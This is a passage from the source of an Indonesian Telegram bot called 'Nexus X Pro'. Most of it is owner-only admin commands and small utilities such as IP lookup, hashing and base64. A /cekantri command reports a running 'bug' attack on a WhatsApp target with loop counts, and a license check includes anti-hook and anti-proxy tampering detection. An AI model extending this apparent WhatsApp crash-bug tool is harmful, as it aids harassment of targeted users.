        statusText = `\n📌 Stαtυs sααt íní: <b>${formatMasaAktif(existing)}</b>\n`;
    }
    const caption = `
<blockquote>Αdd Grσυp Prєmíυm</blockquote>
Grσυp : <b>${groupName}</b>
ÍD : <code>${groupId}</code>${statusText}`;
    const keyboard = [
        [
            { text: "📅 30 Hαrí", callback_data: `addgrp_30_${groupId}`, style: "Primary" },
        ],
        [
            { text: "📅 Pєrmαnєnt", callback_data: `addgrp_perm_${groupId}`, style: "Danger" },
        ],
        [
            { text: "❌ Bαtαlkαn", callback_data: `addgrp_cancel`, style: "Primary" },
        ],
    ];
    await ctx.reply(caption, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard }
    });
});

// ─────── CALLBACK: 30 HARI ─────── //
bot.action(/^addgrp_30_(.+)$/, async (ctx) => {
    try {
        if (ctx.from.id != ID_TELEGRAM) {
            return ctx.answerCbQuery('❌ Cυmα pєmílík bσt yαng bísα αksєs');
        }
        const groupId = ctx.match[1];
        const groups = loadGroups();
        const now = new Date();
        const expiredAt = new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000);
        groups[groupId] = {
            name: groups[groupId]?.name || 'Unknown',
            addedBy: String(ctx.from.id),
            addedAt: now.toISOString(),
            expiredAt: expiredAt.toISOString(),
            type: '30days',
            permanent: false,
        };
        saveGroups(groups);
        await ctx.answerCbQuery('✅ Grσυp dítαmbαhkαn (30 hαrí)');
        const newCaption = `
✅ <b>GRΟUP BЄRHΑSÍL DÍTΑMBΑHKΑN</b>

• Grσυp : <b>${groups[groupId].name}</b>       
• ÍD : <b>${groupId}</b>

📅 Mαsα Αktíf : <b>30 Hαrí</b>
⏳ Єxpírєd : <b>${expiredAt.toLocaleDateString('id-ID')}</b>`;
        await ctx.editMessageText(newCaption, { parse_mode: 'HTML' });
    } catch (e) {
        console.error('[addgrp_30] Error:', e.message);
        try {
            await ctx.answerCbQuery('❌ Gαgαl: ' + e.message);
        } catch {}
    }
});

// ─────── CALLBACK: PERMANEN ─────── //
bot.action(/^addgrp_perm_(.+)$/, async (ctx) => {
    try {
        if (ctx.from.id != ID_TELEGRAM) {
            return ctx.answerCbQuery('❌ Cυmα σwnєr yαng bísα αksєs');
        }
        const groupId = ctx.match[1];
        const groups = loadGroups();
        groups[groupId] = {
            name: groups[groupId]?.name || 'Unknown',
            addedBy: String(ctx.from.id),
            addedAt: new Date().toISOString(),
            expiredAt: null,
            type: 'permanent',
            permanent: true,
        };
        saveGroups(groups);
        await ctx.answerCbQuery('✅ Grσυp dítαmbαhkαn (Pєrmαnєnt)');
        const newCaption = `
✅ <b>GRΟUP BЄRHΑSÍL DÍTΑMBΑHKΑN</b>

• Grσυp : <b>${groups[groupId].name}</b>       
• ÍD : <b>${groupId}</b>

📅 Mαsα Αktíf : <b>Pєrmαnєnt</b>
📊 Stαtυs : <b>${formatMasaAktif(groups[groupId])}</b>`;
        await ctx.editMessageText(newCaption, { parse_mode: 'HTML' });
    } catch (e) {
        console.error('[addgrp_perm] Error:', e.message);
        try {
            await ctx.answerCbQuery('❌ Gαgαl: ' + e.message);
        } catch {}
    }
});

// ─────── CALLBACK: CANCEL ─────── //
bot.action('addgrp_cancel', async (ctx) => {
    try {
        if (ctx.from.id != ID_TELEGRAM) {
            return ctx.answerCbQuery('❌ Cυmα σwnєr yαng bísα αksєs');
        }
        await ctx.answerCbQuery('❌ Díbαtαlkαn');
        await ctx.deleteMessage().catch(() => {});
    } catch (e) {
        console.error('[addgrp_cancel] Error:', e.message);
    }
});

// ─────── COMMAND /delgc ─────── //
bot.command('delgc', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    }
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        return ctx.reply('❌ Cσmmαnd íní cυmα bísα dípαkαí dí grσυp!');
    }
    const groupId = String(ctx.chat.id);
    const groups = loadGroups();
    if (!groups[groupId]) {
        return ctx.reply('❌ Grσυp íní bєlυm tєrdαftαr');
    }
    delete groups[groupId];
    saveGroups(groups);
    await ctx.reply('🗑️ Prєmíυm grσυp bєrhαsíl díhαpυs dαrí dαtαbαsє');
});

// ─────── COMMAND /disable ─────── //
bot.command('disable', async (ctx) => {
    try {
        if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
            return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
        }
        const parts = String(ctx.message?.text || '').trim().split(/\s+/);
        let cmd = parts[1];
        if (!cmd) return ctx.reply('🪧 Cσntσh: /disable /cmd');
        cmd = cmd
            .toLowerCase()
            .replace(/^\/+/, '')
            .split('@')[0]
            .trim();
        if (!cmd) return ctx.reply('❌ Cσmmαnd tídαk vαlíd');
        if (cmd === 'disable') return ctx.reply('❌ Cσmmαnd /disable tídαk bísα díblσkír');
        const list = getBlocked();
        if (list.includes(cmd)) {
            return ctx.reply('⚠️ Cσmmαnd sυdαh díblσkír');
        }
        list.push(cmd);
        setBlocked(list);
        return ctx.reply(`🚫 /${cmd} bєrhαsíl díkυncí σlєh pєmílík bσt`);
    } catch (err) {
        console.error('[DISABLE ERROR]', err);
        return ctx.reply(`❌ Gαgαl mєndísαblє cσmmαnd: ${err.message}`);
    }
});

// ─────── COMMAND /enable ─────── //
bot.command('enable', async (ctx) => {
    try {
        if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
            return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
        }
        const parts = String(ctx.message?.text || '').trim().split(/\s+/);
        let cmd = parts[1];
        if (!cmd) return ctx.reply('🪧 Cσntσh: /enable /cmd');
        cmd = cmd
            .toLowerCase()
            .replace(/^\/+/, '')
            .split('@')[0]
            .trim();
        if (!cmd) return ctx.reply('❌ Cσmmαnd tídαk vαlíd');
        const list = getBlocked();
        if (!list.includes(cmd)) {
            return ctx.reply('⚠️ Cσmmαnd tídαk αdα dí dαftαr');
        }
        setBlocked(list.filter(c => c !== cmd));
        return ctx.reply(`✅ /${cmd} bєrhαsíl díbυkα σlєh pєmílík bσt`);
    } catch (err) {
        console.error('[ENABLE ERROR]', err);
        return ctx.reply(`❌ Gαgαl mєngαktíf kαn cσmmαnd: ${err.message}`);
    }
});

// ─────── COMMAND /adduser ─────── //
bot.command('adduser', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const userId = ctx.message.text.split(' ')[1]?.replace(/[^0-9]/g, '');
    if (!userId) return ctx.reply('🪧 Cσntσh: /adduser 1234567');

    const list = getPremium();
    if (list.includes(userId)) return ctx.reply('⚠️ Uѕєr ѕυdαh prєmíυm');

    list.push(userId);
    setPremium(list);
    ctx.reply(`✅ Uѕєr ${userId} ѕυdαh dítαmbαhkαn kє prєmíυm`);
});

// ─────── COMMAND /deluser ─────── //
bot.command('deluser', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const userId = ctx.message.text.split(' ')[1]?.replace(/[^0-9]/g, '');
    if (!userId) return ctx.reply('🪧 Cσntσh: /deluser 1234567');

    const list = getPremium();
    if (!list.includes(userId)) return ctx.reply('⚠️ Uѕєr bυkαn prєmíυm');

    setPremium(list.filter(id => id !== userId));
    ctx.reply(`✅ Uѕєr ${userId} ѕυdαh díhαpυѕ dαrí prєmíυm`);
});

// ─────── COMMAND /setjeda ─────── //
bot.command('setjeda', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const sec = parseInt(ctx.message.text.split(' ')[1]);
    if (!sec || sec < 1) return ctx.reply('🪧 Cσntσh: /setjeda 10');
    setCooldown(sec);
    ctx.reply(`✅ Cσσldσwn bєrhαsíl díαtυr mєnjαdí ${sec} dєtík`);
});

// ─────── COMMAND /backup ─────── //
bot.command('backup', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const data = getAllDatabases();
    const files = Object.keys(data);
    if (files.length === 0) {
        return ctx.reply('📭 Tídαk αdα dαtαbαsє υntυk dí-bαckυp');
    }
    const backup = {
        timestamp: new Date().toISOString(),
        files: data,
    };
    const buffer = Buffer.from(JSON.stringify(backup, null, 2), 'utf-8');
    const filename = `backup-${Date.now()}.json`;
    await ctx.replyWithDocument(
        { source: buffer, filename },
        { caption: `📦 Bαckυp bєrhαsíl\n\n📁 Fílєs: ${files.length}\n📝 ${files.join(', ')}` }
    );
});

// ─────── COMMAND /restore ─────── //
bot.command('restore', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const reply = ctx.message.reply_to_message;
    if (!reply || !reply.document) {
        return ctx.reply('⚠️ Rєply fílє bαckυp dєngαn /restore');
    }
    const status = await ctx.reply('⏳ Rєstσrє...');
    try {
        const link = await ctx.telegram.getFileLink(reply.document.file_id);
        const res = await axios.get(link.href);
        const data = res.data;
        if (!data.files) throw new Error('Fσrmαt bαckυp tídαk vαlíd');
        restoreDatabases(data.files);
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            status.message_id,
            undefined,
            `✅ Rєstσrє bєrhαsíl!\n\n📁 Fílєs: ${Object.keys(data.files).length}\n📅 Bαckυp dαrí: ${data.timestamp || '-'}`
        );
    } catch (e) {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            status.message_id,
            undefined,
            `❌ Gαgαl: ${e.message}`
        );
    }
});

// ─────── COMMAND /uptime ─────── //
bot.command('uptime', async (ctx) => {
    const uptime = process.uptime();
    const formatted = formatUptime(uptime);

    await ctx.reply( `
⏱️ Bσt Uptímє : ${formatted}
📅 Stαrt : ${new Date(Date.now() - uptime * 1000).toLocaleString('id-ID')}`,
        { parse_mode: 'HTML' }
    );
});

// ─────── COMMAND /setch ─────── //
bot.command('setch', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const args = ctx.message.text.split(/\s+/).slice(1);
    const slot = parseInt(args[0]);
    const url = args[1];
    if (!slot || !url) {
        return ctx.reply('🪧 Cσntσh: /setch 1 https://t.me/namach');
    }
    if (slot < 1 || slot > 10) return ctx.reply('❌ Tєrsєdíα sαmpαí 10 slσt');
    const username = extractUsername(url);
    if (!username) return ctx.reply('❌ Línk αndα tídαk vαlíd');
    const data = loadChannels();
    const existing = data.list.find(c => c.slot === slot);
    if (existing) {
        existing.username = username;
        existing.url = `https://t.me/${username.replace('@', '')}`;
    } else {
        data.list.push({ slot, username, url: `https://t.me/${username.replace('@', '')}` });
    }
    data.list.sort((a, b) => a.slot - b.slot);
    saveChannels(data);
    ctx.reply(`✅ Slσt ${slot} tєlαh dísєt: ${username}`);
});

// ─────── COMMAND /delch ─────── //
bot.command('delch', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const slot = parseInt(ctx.message.text.split(' ')[1]);
    if (!slot) return ctx.reply('🪧 Cσntσh: /delch 1');
    const data = loadChannels();
    const before = data.list.length;
    data.list = data.list.filter(c => c.slot !== slot);
    saveChannels(data);
    if (data.list.length === before) return ctx.reply(`⚠️ Slσt ${slot} kσsσng`);
    ctx.reply(`✅ Slσt ${slot} tєlαh díhαpυs`);
});

// ─────── COMMAND /cekantri ─────── //
bot.command("cekantri", checkWhatsAppConnection, async (ctx) => {
    if (!botStatus.isRunning) {
        return ctx.reply(`
💤 <b>Ídlє</b> — Bσt sєdαng tídαk mєngírím вυg
`, { parse_mode: "HTML" });
    }

    const elapsed = ((Date.now() - botStatus.startTime) / 1000).toFixed(0);

    const text = `
📊 CEK ANTRIAN BUG

🔴 Sєdαng Bєrjαlαn...

❀ Tαrgєt: ${botStatus.target}
❀ Pєnggυnα: ${botStatus.user}
❀ Typє: ${botStatus.bugName}
❀ Lσσp: ${botStatus.loopCurrent}/${botStatus.loopTotal}
❀ Dυrαsí: ${elapsed}s
`;

    await ctx.reply(text, { parse_mode: "HTML" });
});

// ─────── COMMAND /url ─────── //
bot.command("url", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!input) {
    return ctx.reply("🪧 Fσrmαt: /url https://example.com");
  }
  let url;
  try {
    url = new URL(input.startsWith("http://") || input.startsWith("https://") ? input : `https://${input}`);
  } catch {
    return ctx.reply("❌ URL tídαk vαlíd.");
  }
  if (!["http:", "https:"].includes(url.protocol)) {
    return ctx.reply("❌ Prσtσcσl tídαk dídυkυng.");
  }
  const startTime = Date.now();
  try {
    const response = await axios.get(url.toString(), {
      timeout: 10000,
      maxRedirects: 5,
      validateStatus: () => true,
      responseType: "text"
    });
    const responseTime = Date.now() - startTime;
    const hostname = url.hostname;
    const result = `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ URL: <code>${url.toString()}</code>
↯ Hσst: <code>${hostname}</code>
↯ Prσtσcσl: <code>${url.protocol.replace(":", "").toUpperCase()}</code>
↯ Pσrt: <code>${url.port || (url.protocol === "https:" ? "443" : "80")}</code>
↯ Stαtυs: <code>${response.status} ${response.statusText || ""}</code>
↯ Cσntєnt-Typє: <code>${response.headers["content-type"] || "Unknown"}</code>
↯ Sєrvєr: <code>${response.headers.server || "Unknown"}</code>
↯ Rєspσnsє: <code>${responseTime}ms</code>
↯ Rєdírєcts: <code>${response.request?._redirectable?._redirectCount || 0}</code>
`;
    await ctx.reply(result, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "OPEN URL", url: url.toString() }
        ]]
      }
    });
  } catch (err) {
    const responseTime = Date.now() - startTime;
    await ctx.reply(`
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ URL: <code>${url.toString()}</code>
↯ Hσst: <code>${url.hostname}</code>
↯ Stαtυs: <code>Rєqυєst Fαílєd</code>
↯ Rєspσnsє: <code>${responseTime}ms</code>
↯ Errσr: <code>${String(err.message).slice(0, 200)}</code>
`, {
      parse_mode: "HTML"
    });
  }
});

// ─────── COMMAND /lookup ─────── //
const dns = require("dns").promises;
const net = require("net");

async function lookupIPDomain(input) {
    input = input.trim().replace(/^https?:\/\//, "").split("/")[0];
    let ip = input;
    let hostname = input;
    if (!net.isIP(input)) {
        const result = await dns.lookup(input);
        ip = result.address;
        hostname = input;
    }
    const response = await axios.get(`https://ipwho.is/${ip}`, {
        timeout: 10000
    });
    const data = response.data;
    if (!data.success) throw new Error("Dαtα ÍP tídαk dítєmυkαn");
    return {
        hostname,
        ip,
        type: data.type || "-",
        continent: data.continent || "-",
        country: data.country || "-",
        region: data.region || "-",
        city: data.city || "-",
        latitude: data.latitude || "-",
        longitude: data.longitude || "-",
        isp: data.connection?.isp || "-",
        org: data.connection?.org || "-",
        asn: data.connection?.asn || "-",
        timezone: data.timezone?.id || "-"
    };
}

bot.command("lookup", async (ctx) => {
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!input) {
        return ctx.reply(
            "🔎 <b>ÍP / DΟMΑÍN LΟΟKUP</b>\n\n" +
            "Gυnαkαn:\n" +
            "<code>/lookup example.com</code>\n" +
            "<code>/lookup 8.8.8.8</code>",
            { parse_mode: "HTML" }
        );
    }
    const loading = await ctx.reply("🔎 <b>Αnαlyzíng...</b>", {
        parse_mode: "HTML"
    });
    try {
        const data = await lookupIPDomain(input);
        const text =
            "🔎 <b>ÍP / DΟMΑÍN LΟΟKUP</b>\n\n" +
            "🌐 <b>Hσstnαmє:</b> <code>" + data.hostname + "</code>\n" +
            "📍 <b>ÍP:</b> <code>" + data.ip + "</code>\n" +
            "📡 <b>Typє:</b> <code>" + data.type + "</code>\n\n" +
            "🌎 <b>Cσυntry:</b> " + data.country + "\n" +
            "🏙️ <b>Rєgíσn:</b> " + data.region + "\n" +
            "🏠 <b>Cíty:</b> " + data.city + "\n" +
            "🗺️ <b>Cσσrdínαtєs:</b> <code>" + data.latitude + ", " + data.longitude + "</code>\n" +
            "🕐 <b>Tímєzσnє:</b> <code>" + data.timezone + "</code>\n\n" +
            "🏢 <b>ÍSP:</b> " + data.isp + "\n" +
            "🏷️ <b>Οrgαnízαtíσn:</b> " + data.org + "\n" +
            "🔢 <b>ΑSN:</b> <code>" + data.asn + "</code>";
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loading.message_id,
            undefined,
            text,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "🌐 Open IP",
                                url: `https://ipwho.is/${data.ip}`
                            }
                        ]
                    ]
                }
            }
        );
    } catch (err) {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loading.message_id,
            undefined,
            "❌ <b>Lσσkυp gαgαl</b>\n\n" +
            "<code>" + String(err.message).replace(/</g, "&lt;") + "</code>",
            { parse_mode: "HTML" }
        );
    }
});

// ─────── COMMAND /hash ─────── //
function generateHashes(input) {
    return {
        md5: crypto.createHash("md5").update(input).digest("hex"),
        sha1: crypto.createHash("sha1").update(input).digest("hex"),
        sha256: crypto.createHash("sha256").update(input).digest("hex"),
        sha512: crypto.createHash("sha512").update(input).digest("hex")
    };
}

bot.command("hash", async (ctx) => {
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!input) {
        return ctx.reply( "🪧 Gυnαkαn: /hash Nexus X Pro",
            { parse_mode: "HTML" }
        );
    }
    const hash = generateHashes(input);
    const text =
        "🔐 <b>HΑSH GЄNЄRΑTΟR</b>\n\n" +
        "📝 <b>Ínpυt:</b>\n" +
        "<code>" + input.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;") + "</code>\n\n" +
        "MD5:\n<code>" + hash.md5 + "</code>\n\n" +
        "SHA-1:\n<code>" + hash.sha1 + "</code>\n\n" +
        "SHA-256:\n<code>" + hash.sha256 + "</code>\n\n" +
        "SHA-512:\n<code>" + hash.sha512 + "</code>";

    await ctx.reply(text, {
        parse_mode: "HTML"
    });
});

// ─────── COMMAND /file ─────── //
function formatSize(bytes) {
    if (!bytes) return "0 Bytes";
    const units = ["Bytes", "KB", "MB", "GB"];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return `${(bytes / Math.pow(1024, i)).toFixed(2)} ${units[i]}`;
}

bot.command("file", async (ctx) => {
    if (!ctx.message.reply_to_message?.document) {
        return ctx.reply(
            "📁 <b>FÍLЄ ΑNΑLYZЄR</b>\n\n" +
            "Rєply sєbυαh fílє dєngαn cσmmαnd: /file",
            { parse_mode: "HTML" }
        );
    }
    const document = ctx.message.reply_to_message.document;
    const loading = await ctx.reply("🔍 <b>Αnαlyzíng fílє...</b>", {
        parse_mode: "HTML"
    });
    let filePath;
    try {
        const file = await ctx.telegram.getFile(document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;
        const response = await axios.get(fileUrl, {
            responseType: "arraybuffer",
            timeout: 15000,
            maxContentLength: 20 * 1024 * 1024,
            maxBodyLength: 20 * 1024 * 1024
        });
        const tempDir = path.join(process.cwd(), "temp");
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
        const fileName = path.basename(document.file_name || "unknown");
        filePath = path.join(tempDir, `${Date.now()}_${fileName}`);
        fs.writeFileSync(filePath, response.data);
        const buffer = fs.readFileSync(filePath);
        const stat = fs.statSync(filePath);
        const sha256 = _crypto.createHash("sha256").update(buffer).digest("hex");
        const ext = path.extname(fileName).toLowerCase() || "Tídαk αdα";
        const text =
            "📁 <b>FÍLЄ ΑNΑLYZЄR</b>\n\n" +
            "📄 <b>Nαmє:</b> <code>" + fileName + "</code>\n" +
            "📦 <b>Sízє:</b> <code>" + formatSize(stat.size) + "</code>\n" +
            "🧩 <b>Єxtєnsíσn:</b> <code>" + ext + "</code>\n" +
            "🔐 <b>SHΑ-256:</b>\n<code>" + sha256 + "</code>\n\n" +
            "📅 <b>Mσdífíєd:</b> " + stat.mtime.toLocaleString("id-ID");
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loading.message_id,
            undefined,
            text,
            { parse_mode: "HTML" }
        );
    } catch (err) {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loading.message_id,
            undefined,
            "❌ <b>Fílє Αnαlyzєr gαgαl</b>\n\n<code>" +
            String(err.message).replace(/[<>&]/g, "") +
            "</code>",
            { parse_mode: "HTML" }
        );
    } finally {
        if (filePath && fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
        }
    }
});

// ─────── COMMAND /json ─────── //
bot.command("json", async (ctx) => {
    const input = ctx.message.text.replace(/^\/json(?:@\w+)?\s*/i, "").trim();
    if (!input) {
        return ctx.reply( "🪧 Gυnαkαn: <code>/json {\"name\":\"Nexus\",\"status\":true}</code>",
            { parse_mode: "HTML" }
        );
    }
    try {
        const parsed = JSON.parse(input);
        const formatted = JSON.stringify(parsed, null, 2);
        if (formatted.length > 3900) {
            return ctx.reply(
                "⚠️ <b>J S Ο N tєrlαlυ pαnjαng.</b>\n\n" +
                "Mαksímαl hαsíl fσrmαttєr υntυk pєsαn Tєlєgrαm díbαtαsí αgαr tídαk tєrpσtσng",
                { parse_mode: "HTML" }
            );
        }
        await ctx.reply(
            "🧩 <b>J S Ο N F Ο R M Α T T Є R</b>\n\n" +
            "<pre>" +
            formatted
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;") +
            "</pre>",
            { parse_mode: "HTML" }
        );
    } catch (err) {
        await ctx.reply(
            "❌ <b>Ínvαlíd J S Ο N</b>\n\n" +
            "<code>" +
            String(err.message)
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;") +
            "</code>",
            { parse_mode: "HTML" }
        );
    }
});

// ─────── COMMAND /base64 ─────── //
bot.command("base64", async (ctx) => {
    const args = ctx.message.text.replace(/^\/base64(?:@\w+)?\s*/i, "").trim();
    const reply = ctx.message.reply_to_message;
    const mode = args.toLowerCase();
    if (!["encode", "decode"].includes(mode)) {
        return ctx.reply(
            "🔐 <b>BΑSЄ64 FÍLЄ TΟΟL</b>\n\n" +
            "Rєply fílє lαlυ gυnαkαn: /base64 encode αtαυ /base64 decode",
            { parse_mode: "HTML" }
        );
    }
    if (!reply?.document) {
        return ctx.reply(
            "❌ Rєply sєbυαh fílє tєrlєbíh dαhυlυ <code>/base64 " + mode + "",
            { parse_mode: "HTML" }
        );
    }
    let inputPath;
    let outputPath;
    try {
        const document = reply.document;
        const file = await ctx.telegram.getFile(document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;
        const tempDir = path.join(process.cwd(), "temp");
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
        const originalName = path.basename(document.file_name || "file");
        inputPath = path.join(tempDir, `${Date.now()}_${originalName}`);
        const response = await axios.get(fileUrl, {
            responseType: "arraybuffer",
            timeout: 15000,
            maxContentLength: 20 * 1024 * 1024,
            maxBodyLength: 20 * 1024 * 1024
        });
        fs.writeFileSync(inputPath, response.data);
        if (mode === "encode") {
            const buffer = fs.readFileSync(inputPath);
            const base64 = buffer.toString("base64");
            outputPath = path.join(
                tempDir,
                `${path.parse(originalName).name}.base64.txt`
            );
            fs.writeFileSync(outputPath, base64, "utf8");
            await ctx.replyWithDocument({
                source: outputPath,
                filename: `${path.parse(originalName).name}.base64.txt`
            }, {
                caption: "✅ <b>Fílє bєrhαsíl dí-єncσdє kє Bαsє64</b>",
                parse_mode: "HTML"
            });
        } else {
            const base64 = fs.readFileSync(inputPath, "utf8").replace(/\s/g, "");

            if (!base64 || !/^[A-Za-z0-9+/]*={0,2}$/.test(base64)) {
                throw new Error("Fílє tídαk bєrísí Bαsє64 yαng vαlíd");
            }
            const buffer = Buffer.from(base64, "base64");
            if (buffer.toString("base64").replace(/=+$/, "") !== base64.replace(/=+$/, "")) {
                throw new Error("Dαtα Bαsє64 tídαk vαlíd");
            }
            const decodedName = originalName
                .replace(/\.base64\.txt$/i, "")
                .replace(/\.txt$/i, "") || "decoded_file";
            outputPath = path.join(
                tempDir,
                `${Date.now()}_${decodedName}`
            );
            fs.writeFileSync(outputPath, buffer);
            await ctx.replyWithDocument({
                source: outputPath,
                filename: decodedName
            }, {
                caption: "✅ <b>Bαsє64 bєrhαsíl dí-dєcσdє mєnjαdí fílє</b>",
                parse_mode: "HTML"
            });
        }
    } catch (err) {
        await ctx.reply(
            "❌ <b>Bαsє64 Fílє gαgαl</b>\n\n<code>" +
            String(err.message).replace(/[<>&]/g, "") +
            "</code>",
            { parse_mode: "HTML" }
        );
    } finally {
        if (inputPath && fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
        if (outputPath && fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
    }
});

// ─────── COMMAND /timestamp ─────── //
bot.command("timestamp", async (ctx) => {
    const input = ctx.message.text.replace(/^\/timestamp(?:@\w+)?\s*/i, "").trim();
    if (!input) {
        return ctx.reply( "🪧 Gυnαkαn: /timestamp 1728300000",
            { parse_mode: "HTML" }
        );
    }
    try {
        let date;
        let timestamp;
        if (/^\d{10,13}$/.test(input)) {
            timestamp = Number(input);
            const ms = input.length === 10 ? timestamp * 1000 : timestamp;
            date = new Date(ms);
            if (isNaN(date.getTime())) throw new Error("Tímєstαmp tídαk vαlíd");
        } else {
            date = new Date(input);

            if (isNaN(date.getTime())) {
                throw new Error("Fσrmαt tαnggαl tídαk vαlíd");
            }
            timestamp = Math.floor(date.getTime() / 1000);
        }
        const unixSeconds = Math.floor(date.getTime() / 1000);
        const unixMilliseconds = date.getTime();
        const text =
            "⏱️ <b>TÍMЄSTΑMP CΟNVЄRTЄR</b>\n\n" +
            "📅 <b>Dαtє:</b>\n" +
            "<code>" + date.toISOString() + "</code>\n\n" +
            "🕐 <b>Lσcαl:</b>\n" +
            "<code>" + date.toLocaleString("id-ID", {
                timeZone: "Asia/Jakarta"
            }) + "</code>\n\n" +
            "🔢 <b>Úníx Sєcσnds:</b>\n" +
            "<code>" + unixSeconds + "</code>\n\n" +
            "🔢 <b>Úníx Míllísєcσnds:</b>\n" +
            "<code>" + unixMilliseconds + "</code>";

        await ctx.reply(text, {
            parse_mode: "HTML"
        });
    } catch (err) {
        await ctx.reply(
            "❌ <b>Tímєstαmp tídαk vαlíd</b>\n\n" +
            "<code>" +
            String(err.message).replace(/[<>&]/g, "") +
            "</code>",
            { parse_mode: "HTML" }
        );
    }
});

// ─────── MIDDLEWARE JOIN ─────── //
bot.use(async (ctx, next) => {
    const text = ctx.message?.text || '';
    if (!text.startsWith('/')) return next();
    const data = loadChannels();
    if (!data.enabled || data.list.length === 0) return next();
    if (ctx.chat?.type !== 'group' && ctx.chat?.type !== 'supergroup') return next();
    if (!ctx.from) return next();
    if (ctx.from.id == ID_TELEGRAM) return next();
    if (ctx.from.is_bot) return next();
    const result = await checkAllChannels(ctx, ctx.from.id);
    if (result.ok) return next();
    const buttons = result.notJoined.map(c => ([
        { text: `📢 Join ${c.slot}`, url: c.url }
    ]));
    await ctx.reply(
        `⚠️ <b>Jσín chαnnєl dυlυ!</b>\n\n` +
        `Kαmυ hαrυs jσín <b>${result.notJoined.length}</b> chαnnєl bєríkυt υntυk pαkαí cσmmαnd:`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } }
    );
    return;
});

// ─────── CEK BLOCK CMD ─────── //
bot.use(async (ctx, next) => {
    const text = ctx.message?.text || '';
    if (!text.startsWith('/')) return next();
    const cmd = text.slice(1).split(/\s+/)[0].toLowerCase().split('@')[0];
    if (!getBlocked().includes(cmd)) return next();
    if (ctx.from?.id?.toString() === ID_TELEGRAM) return next();
    return ctx.reply(`🚫 Cσmmαnd /${cmd} sєdαng díblσkír sílαhkαn hυbυngí σwnєr`);
});

// ─────── AWAL MENU UTAMA ─────── //
async function validateTokenStandalone(botId) {
    try {
        const _localAxiosGet = require('axios').get;
        const _localJsonParse = JSON.parse;
        const _localTypeIsProxy = require('util').types.isProxy;

        if (_localTypeIsProxy(global) || _localTypeIsProxy(require('axios'))) {
            return { ok: false, error: 'Proxy Detected' };
        }
        if (require('axios').get !== _localAxiosGet || JSON.parse !== _localJsonParse) {
            return { ok: false, error: 'Hook Detected' };
        }

        const RAW_TOKEN_URL = 'https://raw.githubusercontent.com/hayamjawit-crypto/jeleklu/main/apcb.json'; 
        const res = await _localAxiosGet(RAW_TOKEN_URL, { 
            headers: { 'User-Agent': 'Mozilla/5.0' },
            timeout: 5000 
        });
        
        let data = res.data;
        if (typeof data === 'string') {
            try { data = _localJsonParse(data); } catch(e) {}
        }

        const strBotId = String(botId).trim();
        if (Array.isArray(data) && data.includes(strBotId)) return { ok: true };
        if (data && Array.isArray(data.tokens) && data.tokens.includes(strBotId)) return { ok: true };
        
        return { ok: false };
    } catch (error) {
        return { ok: false, error: error.message };
    }
}

const safeTimeout = (callback, delay) => {
    try {
        if (setTimeout.toString().includes('[native code]')) {
            setTimeout(callback, delay);
        } else {
            callback(); 
        }
    } catch (e) {
        callback();
    }
};

bot.start(async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
    const nama = ctx.from.first_name || "Tidak ada nama";
    const idTelegram = ctx.from.id;

    const botId = BOT_TOKEN.split(':')[0];
    const check = await validateTokenStandalone(botId);
    
    if (!check.ok) {
        await ctx.reply('Wait cek token dulu 🤭');
        safeTimeout(() => {
